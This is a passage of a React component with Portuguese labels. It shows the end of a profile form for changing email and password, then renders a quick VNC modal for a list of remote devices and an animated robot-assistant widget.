                  value={profileEmail} 
                  onChange={(e) => setProfileEmail(e.target.value)} 
                  required
                  className="w-full bg-slate-950 border border-slate-800 focus:border-blue-500/50 focus:ring-1 focus:ring-blue-500/35 rounded-xl px-4 py-2 text-sm text-white transition-all outline-none"
                />
              </div>
              <div className="border-t border-slate-900/80 pt-3">
                <p className="text-[10px] text-slate-500 font-medium mb-3">Deseja alterar a senha? Deixe em branco se não quiser mudar.</p>
                
                <div className="space-y-3">
                  <div>
                    <label className="block text-[10px] uppercase font-bold text-slate-400 mb-1.5 tracking-wider font-mono">Nova Senha</label>
                    <input 
                      type="password" 
                      value={profilePassword} 
                      onChange={(e) => setProfilePassword(e.target.value)} 
                      placeholder="••••••••"
                      className="w-full bg-slate-950 border border-slate-800 focus:border-blue-500/50 focus:ring-1 focus:ring-blue-500/35 rounded-xl px-4 py-2 text-sm text-white transition-all outline-none placeholder:text-slate-800"
                    />
                  </div>
                  <div>
                    <label className="block text-[10px] uppercase font-bold text-slate-400 mb-1.5 tracking-wider font-mono">Confirmar Nova Senha</label>
                    <input 
                      type="password" 
                      value={profileConfirmPassword} 
                      onChange={(e) => setProfileConfirmPassword(e.target.value)} 
                      placeholder="••••••••"
                      className="w-full bg-slate-950 border border-slate-800 focus:border-blue-500/50 focus:ring-1 focus:ring-blue-500/35 rounded-xl px-4 py-2 text-sm text-white transition-all outline-none placeholder:text-slate-800"
                    />
                  </div>
                </div>
              </div>
              <button 
                type="submit"
                disabled={isSavingProfile}
                className="w-full py-2.5 bg-gradient-to-r from-blue-600 to-cyan-500 hover:from-blue-700 hover:to-cyan-600 text-white rounded-xl text-xs font-bold uppercase tracking-wider shadow-[0_0_15px_rgba(220,38,38,0.2)] transition-all flex items-center justify-center gap-2"
              >
                {isSavingProfile ? 'Salvando...' : 'Salvar Alterações'}
              </button>
            </form>
          </div>
        </div>
      )}

      {quickVncDevices.length > 0 && (
        <QuickVNCModal
          devices={quickVncDevices}
          onClose={() => setQuickVncDevices([])}
          onRemoveDevice={handleRemoveVnc}
          onNavigateToDevice={(deviceId) => {
            setQuickVncDevices([]);
            navigate(`/device/${deviceId}`);
          }}
        />
      )}

      {/* 🤖 ROBÔ ASSISTENTE ANIMADO & TUTORIAL */}
      <RobotAssistant />

    </div>
  );
}
